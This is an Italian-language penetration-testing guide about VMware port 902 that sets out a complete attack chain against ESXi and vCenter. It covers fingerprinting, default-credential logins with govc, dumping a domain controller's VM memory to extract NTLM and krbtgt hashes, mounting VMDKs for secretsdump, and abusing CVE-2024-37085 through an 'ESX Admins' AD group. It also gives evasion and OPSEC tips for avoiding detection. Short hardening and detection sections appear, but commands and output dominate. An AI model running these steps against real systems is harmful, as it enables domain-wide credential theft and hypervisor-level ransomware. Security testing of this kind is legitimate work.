---
title: 'Porta 902 VMware ESXi: vCenter, vmware-authd e rischio hypervisor.'
slug: porta-902-vmware
description: >-
  Scopri cos’è la porta 902 VMware, usata nelle comunicazioni core tra vCenter
  Server ed ESXi, e perché identificare un host con vmware-authd significa
  trovare una superficie ad alto impatto per l’intera infrastruttura virtuale.
image: /porta-902-vmware.webp
draft: false
date: 2026-04-08T00:00:00.000Z
categories:
  - networking
subcategories:
  - porte
tags:
  - esx-admins
  - vmware-authd
---

> **Executive Summary** — La porta 902 è il canale di comunicazione di VMware per la console remota delle VM (VMRC), l'heartbeat dell'host agent e il data transfer tra vCenter e gli host ESXi. La sua presenza indica infrastruttura VMware — ESXi, vCenter o Workstation. Un ESXi compromesso dà accesso a tutte le VM ospitate: dump memoria, snapshot, accesso ai dischi virtuali e potenzialmente l'intero datacenter virtuale. Questa guida copre fingerprinting, credenziali default, CVE critiche e post-exploitation ESXi.

```id="h2q9sx"
TL;DR

- La porta 902 indica VMware ESXi/vCenter — infrastruttura di virtualizzazione che ospita decine o centinaia di VM
- Credenziali default ESXi (root senza password su vecchie versioni) e vCenter (administrator@vsphere.local con password debole) sono ancora comuni
- Compromettere ESXi significa accesso a tutte le VM: dump memoria (estrae credenziali in chiaro), snapshot, mount VMDK e ransomware a livello hypervisor

```

Porta 902 VMware è il canale TCP usato da VMware per il protocollo proprietario di comunicazione tra client, vCenter Server e host ESXi. La porta 902 vulnerabilità principali sono le credenziali default non cambiate, le CVE critiche su ESXi/vCenter (incluse quelle sfruttate attivamente da ransomware group) e l'accesso non autorizzato alla console delle VM. L'enumerazione porta 902 conferma la presenza di infrastruttura VMware e rivela la versione di ESXi. Nel VMware pentest, compromettere l'hypervisor è il "game over" dell'infrastruttura — da ESXi si controllano tutte le VM ospitate. Nella kill chain si posiziona come lateral movement (da rete a hypervisor) e come impact (ransomware a livello VM, data exfiltration massiva).

## 1. Anatomia Tecnica della Porta 902

La porta 902 è il canale proprietario VMware per diverse funzioni:

| Porta   | Servizio                | Ruolo                                           |
| ------- | ----------------------- | ----------------------------------------------- |
| 443     | vSphere Web Client      | Interfaccia HTTPS di gestione                   |
| **902** | **VMware Auth/Console** | **Console VM (VMRC), heartbeat, data transfer** |
| 903     | VMware Console (alt)    | Console remota alternativa                      |
| 5480    | VAMI                    | Virtual Appliance Management                    |
| 8697    | vSAN                    | Storage virtuale                                |

Il flusso sulla porta 902:

1. Client VMware (vSphere Client, VMRC) si connette alla 902
2. Autenticazione con credenziali ESXi o vCenter
3. Canale bidirezionale per: console VM (tastiera/video/mouse), trasferimento file (datastore), heartbeat host-vCenter
4. Il traffico è cifrato con TLS (versioni recenti)

```
Misconfig: Credenziali ESXi default (root senza password o root:vmware)
Impatto: accesso completo all'hypervisor — tutte le VM compromesse
Come si verifica: connessione vSphere Client o API a https://[ESXi]:443
```

```
Misconfig: ESXi/vCenter non aggiornato (CVE critiche)
Impatto: RCE sull'hypervisor — CVE-2021-21974 (HeapOverflow), CVE-2024-37085 (auth bypass)
Come si verifica: nmap -sV rivela la build ESXi — confronta con advisory VMware
```

```
Misconfig: Porta 902 esposta su rete non segmentata
Impatto: accesso diretto alla console VM da qualsiasi host sulla rete
Come si verifica: nmap -p 902 [subnet] — se raggiungibile da rete utenti, è esposta
```

## 2. Enumerazione Base

### Comando 1: Nmap

```bash
nmap -sV -sC -p 902,443 10.10.10.50
```

**Output atteso:**

```
PORT    STATE SERVICE    VERSION
443/tcp open  ssl/https  VMware ESXi 8.0 Update 2
902/tcp open  ssl/vmware-auth VMware Authentication Daemon 1.10
```

**Parametri:**

* `-sV`: versione ESXi esatta (fondamentale per CVE matching)
* `-sC`: script default — banner e certificato
* `-p 902,443`: porta console + web interface

**Cosa ci dice questo output:** ESXi 8.0 Update 2 con porta 902 aperta per la console. La versione esatta permette di verificare le CVE applicabili. Il certificato TLS sulla 443 rivela hostname e organizzazione.

### Comando 2: Banner grab sulla 902

```bash
ncat --ssl 10.10.10.50 902
```

**Output atteso:**

```
220 VMware Authentication Daemon Version 1.10: SSL Required, ServerDaemonProtocol:SOAP, MKSDisplayProtocol:VNC
```

**Cosa ci dice questo output:** il daemon di autenticazione VMware è attivo. `MKSDisplayProtocol:VNC` indica che la console VM usa VNC over VMware auth — potenzialmente intercettabile.

## 3. Enumerazione Avanzata

### Fingerprint versione ESXi via SOAP API

```bash
curl -sk https://10.10.10.50/sdk/vimServiceVersions.xml
```

**Output:**

```xml
<namespace>
  <name>urn:vim25</name>
  <version>8.0.2.0</version>
  <priorVersions>
    <version>7.0</version>
    <version>6.7</version>
  </priorVersions>
</namespace>
```

**Lettura dell'output:** versione API 8.0.2.0 — corrisponde a ESXi 8.0 Update 2. Questa informazione è critica per il CVE matching.

### Enumerazione VM con credenziali

```bash
# Con govc (CLI VMware)
export GOVC_URL=https://10.10.10.50/sdk
export GOVC_USERNAME=root
export GOVC_PASSWORD=vmware
export GOVC_INSECURE=1

govc ls /ha-datacenter/vm/
```

**Output:**

```
/ha-datacenter/vm/DC01
/ha-datacenter/vm/SQL01
/ha-datacenter/vm/WEB01
/ha-datacenter/vm/FileServer
```

**Lettura dell'output:** quattro VM ospitate — incluso un DC (`DC01`), un SQL server e un file server. Compromettere l'ESXi significa compromettere tutte queste macchine. Per la [compromissione AD via hypervisor](https://hackita.it/articoli/active-directory), il dump della memoria del DC estrae le credenziali in chiaro.

### Lista snapshot e datastore

```bash
govc snapshot.tree -vm DC01
govc datastore.ls -ds datastore1
```

**Output:**

```
Snapshot: pre-update-2025
  Created: 2025-12-15

datastore1/DC01/
  DC01.vmx
  DC01-flat.vmdk (80GB)
  DC01.nvram
```

**Lettura dell'output:** uno snapshot esistente del DC e il disco virtuale VMDK accessibile. Il VMDK può essere montato offline per estrarre SAM/SYSTEM/NTDS.dit senza toccare la VM.

## 4. Tecniche Offensive

**Test credenziali default**

Contesto: ESXi appena identificato. Testa credenziali note.

```bash
# Credenziali default ESXi
govc about -u "root:@10.10.10.50"     # root senza password (ESXi < 7.0)
govc about -u "root:vmware@10.10.10.50"  # root:vmware (vecchie versioni)
govc about -u "root:V!mware123@10.10.10.50"  # root:V!mware123 (lab comuni)

# vCenter default
govc about -u "administrator@vsphere.local:VMware1!@10.10.10.51"
```

**Output (successo):**

```
FullName: VMware ESXi 8.0.2 build-22380479
```

**Cosa fai dopo:** accesso root all'ESXi. Da qui puoi: accedere alla console di ogni VM, creare snapshot, scaricare VMDK, dumpare la memoria delle VM.

**Dump memoria VM per estrazione credenziali**

Contesto: accesso ESXi. Vuoi estrarre credenziali dalla memoria del DC.

```bash
# Crea snapshot con dump memoria
govc snapshot.create -vm DC01 -m=true pentest-snap

# Scarica il file memoria
govc datastore.download -ds datastore1 DC01/DC01-Snapshot1.vmem /tmp/dc01.vmem

# Analizza con volatility
vol3 -f /tmp/dc01.vmem windows.hashdump
vol3 -f /tmp/dc01.vmem windows.lsadump
```

**Output (volatility):**

```
Administrator:500:aad3b435...:a1b2c3d4e5f6a7b8...
krbtgt:502:aad3b435...:f1e2d3c4b5a69788...
```

**Cosa fai dopo:** hash NTLM di Administrator e krbtgt estratti dalla memoria. Con l'hash di krbtgt puoi creare un [Golden Ticket](https://hackita.it/articoli/kerberos). Questo è il path più devastante: hypervisor → DC memory → Domain Admin.

**Mount VMDK offline**

Contesto: scarichi il disco virtuale del DC per estrazione offline.

```bash
# Scarica il VMDK
govc datastore.download -ds datastore1 DC01/DC01-flat.vmdk /tmp/dc01.vmdk

# Monta con guestmount
guestmount -a /tmp/dc01.vmdk -i --ro /mnt/dc01

# Estrai SAM e SYSTEM
secretsdump.py -sam /mnt/dc01/Windows/System32/config/SAM \
  -system /mnt/dc01/Windows/System32/config/SYSTEM LOCAL
```

**Output:**

```
Administrator:500:aad3b435...:a1b2c3d4...
```

**Cosa fai dopo:** hash NTLM del local Administrator. Se il VMDK contiene NTDS.dit: `secretsdump.py -ntds /mnt/dc01/Windows/NTDS/ntds.dit -system /mnt/dc01/.../SYSTEM LOCAL` per dumpare tutti gli hash del dominio.

**CVE-2024-37085 — vCenter auth bypass per AD-joined ESXi**

Contesto: ESXi joinato ad Active Directory. Crei un gruppo `ESX Admins` in AD per ottenere accesso admin all'ESXi.

```bash
# Con credenziali AD (anche low-priv con permesso di creare gruppi):
# Crea il gruppo "ESX Admins" in AD
net rpc group add "ESX Admins" -U user%pass -S dc01.corp.local

# Aggiungi te stesso al gruppo
net rpc group addmem "ESX Admins" "user" -U user%pass -S dc01.corp.local

# Ora accedi a ESXi come admin
govc about -u "corp\\user:pass@10.10.10.50"
```

**Cosa fai dopo:** accesso admin a ESXi tramite AD group abuse. Questa CVE è stata sfruttata massivamente da gruppi ransomware nel 2024-2025 per cifrare le VM a livello hypervisor.

## 5. Scenari Pratici di Pentest

### Scenario 1: ESXi standalone con credenziali default

**Situazione:** ESXi in rete DMZ con porta 902 e 443 aperte. Assessment interno.

**Step 1:**

```bash
nmap -sV -p 443,902 10.10.10.50
```

**Step 2:**

```bash
govc about -u "root:vmware@10.10.10.50"
govc ls /ha-datacenter/vm/
```

**Se fallisce:**

* Causa: password cambiata
* Fix: prova `root:VMware1!`, `root:V!mware1!`, `root:password`, poi credential spray

**Tempo stimato:** 5-10 minuti

### Scenario 2: vCenter con AD integration

**Situazione:** vCenter gestisce 20 host ESXi. ESXi joinati ad AD.

**Step 1:**

```bash
nmap -sV -p 443,902 10.10.10.51  # vCenter
```

**Step 2:**

```bash
# CVE-2024-37085 check
python3 rpcdump.py 10.10.10.51 | grep -i "ESX Admins"
# Se il gruppo non esiste, crealo
```

**Se fallisce:**

* Causa: ESXi non joinato ad AD
* Fix: testa credenziali vCenter locali, API exploit

**Tempo stimato:** 15-30 minuti

### Scenario 3: Post-exploitation — ransomware simulation

**Situazione:** assessment purple team. Simula cifratura VM a livello ESXi.

**Step 1:**

```bash
# Accesso ESXi confermato
govc vm.power -off DC01  # Spegni la VM
```

**Step 2:**

```bash
# Accedi via SSH a ESXi
ssh root@10.10.10.50
vim-cmd vmsvc/getallvms  # Lista VM
# Simula cifratura: rinomina VMDK (non cifrare realmente in un pentest!)
```

**Se fallisce:**

* Causa: SSH disabilitato su ESXi
* Fix: abilita via DCUI o API: `govc host.service enable -name TSM-SSH`

**Tempo stimato:** 5-10 minuti

## 6. Attack Chain Completa

| Fase        | Tool           | Comando                                              | Risultato             |
| ----------- | -------------- | ---------------------------------------------------- | --------------------- |
| Recon       | nmap           | `nmap -sV -p 443,902 [subnet]`                       | ESXi/vCenter trovati  |
| Version     | curl           | `curl -sk https://[ESXi]/sdk/vimServiceVersions.xml` | Build esatta          |
| Creds       | govc           | `govc about -u "root:vmware@[ESXi]"`                 | Accesso hypervisor    |
| VM Enum     | govc           | `govc ls /ha-datacenter/vm/`                         | Lista VM              |
| Memory Dump | govc/vol3      | Snapshot + download .vmem + volatility               | Credenziali in chiaro |
| VMDK Mount  | guestmount     | Mount VMDK + secretsdump                             | Hash NTLM/NTDS        |
| AD Bypass   | CVE-2024-37085 | Crea "ESX Admins" group in AD                        | Admin ESXi via AD     |

## 7. Detection & Evasion

### Blue Team

* **ESXi log**: `/var/log/auth.log` per login, `/var/log/hostd.log` per operazioni API
* **vCenter**: task recenti visibili nel vSphere Client
* **SIEM**: login anomali su ESXi, creazione snapshot non pianificati

### Evasion

```
Tecnica: Usa API SOAP invece di SSH
Come: govc usa l'API HTTPS (443) — meno monitorata di SSH
Riduzione rumore: le operazioni API si confondono con l'attività normale di vCenter
```

```
Tecnica: Snapshot durante maintenance window
Come: crea snapshot quando ci sono già operazioni pianificate
Riduzione rumore: lo snapshot si confonde con backup legittimi
```

## 8. Toolchain e Confronto

| Aspetto       | VMware (902)        | Proxmox (8006) | Hyper-V (various) | KVM/libvirt |
| ------------- | ------------------- | -------------- | ----------------- | ----------- |
| Console       | 902/TCP             | 8006/TCP (web) | RDP / VMConnect   | VNC/SPICE   |
| API           | SOAP/REST (443)     | REST API       | WMI/PowerShell    | libvirt API |
| Default creds | root:(vuoto/vmware) | root:pve?      | Integrato AD      | N/A         |
| CVE recenti   | CVE-2024-37085      | CVE-2024-xx    | CVE-2024-xx       | Rari        |

## 9. Troubleshooting

| Errore                  | Causa                  | Fix                                                      |
| ----------------------- | ---------------------- | -------------------------------------------------------- |
| 902 filtered            | Firewall blocca        | Usa solo 443 per API SOAP                                |
| `govc: ServerFaultCode` | Credenziali errate     | Verifica formato: `user:pass@host`                       |
| SSH refused su ESXi     | TSM-SSH disabilitato   | `govc host.service enable TSM-SSH` via API               |
| VMDK download timeout   | File troppo grande     | Usa `--progress` e connessione stabile                   |
| volatility no profile   | Profilo OS non trovato | Specifica: `--profile Win2019x64` o usa vol3 auto-detect |

## 10. FAQ

**D: La porta 902 è sempre VMware?**
R: Praticamente sì. La 902 è assegnata IANA a VMware e usata esclusivamente dall'ecosistema vSphere per autenticazione e console.

**D: Posso accedere alla console VM solo con la porta 902?**
R: No, serve anche autenticazione (tipicamente via 443 per il token). La 902 è il canale dati della console, ma l'autenticazione passa per l'API.

**D: Come proteggere ESXi sulla porta 902?**
R: Isola ESXi su VLAN di management dedicata. Cambia la password root. Disabilita SSH. Aggiorna regolarmente. Non joinare ESXi ad AD a meno che non sia strettamente necessario (CVE-2024-37085).

## 11. Cheat Sheet Finale

| Azione          | Comando                                                   |
| --------------- | --------------------------------------------------------- |
| Scan            | `nmap -sV -p 443,902 [target]`                            |
| Version         | `curl -sk https://[ESXi]/sdk/vimServiceVersions.xml`      |
| Banner 902      | `ncat --ssl [target] 902`                                 |
| Login test      | `govc about -u "root:vmware@[ESXi]"`                      |
| VM list         | `govc ls /ha-datacenter/vm/`                              |
| Snapshot        | `govc snapshot.create -vm [VM] -m=true [name]`            |
| Download VMEM   | `govc datastore.download -ds [ds] [VM]/[file].vmem /tmp/` |
| Download VMDK   | `govc datastore.download -ds [ds] [VM]/[file].vmdk /tmp/` |
| Memory analysis | `vol3 -f [vmem] windows.hashdump`                         |
| Enable SSH      | `govc host.service enable TSM-SSH`                        |

### Perché Porta 902 è rilevante nel 2026

VMware ESXi è l'hypervisor enterprise dominante. Gruppi ransomware (BlackCat, Royal, LockBit) attaccano direttamente ESXi per cifrare tutte le VM in un colpo. CVE-2024-37085 ha reso l'escalation banale in ambienti AD-joined. Credenziali default sono ancora presenti. Un ESXi compromesso è il singolo punto di compromissione più devastante in un'infrastruttura enterprise.

### Hardening

* Password root forte e unica su ogni ESXi
* VLAN di management dedicata per ESXi
* Non joinare ESXi ad AD (CVE-2024-37085)
* Aggiorna ESXi regolarmente
* Disabilita SSH quando non necessario
* Lockdown mode per limitare l'accesso API

### OPSEC

L'API SOAP (443) è meno monitorata di SSH. Le operazioni via govc si confondono con l'attività vCenter normale. Lo snapshot è l'operazione più visibile — fallo durante le maintenance window. Il download VMDK genera molto traffico — usa compressione e fasce orarie a basso monitoraggio. Approfondimento: [https://www.cbtnuggets.com/common-ports/what-is-port-902](https://www.cbtnuggets.com/common-ports/what-is-port-902)

***

Riferimento: VMware KB, CVE-2024-37085, CVE-2021-21974. Uso esclusivo in ambienti autorizzati.

> Vuoi supportare HackIta? [hackita.it/supporto](https://hackita.it/supporto) — [hackita.it/servizi](https://hackita.it/servizi).
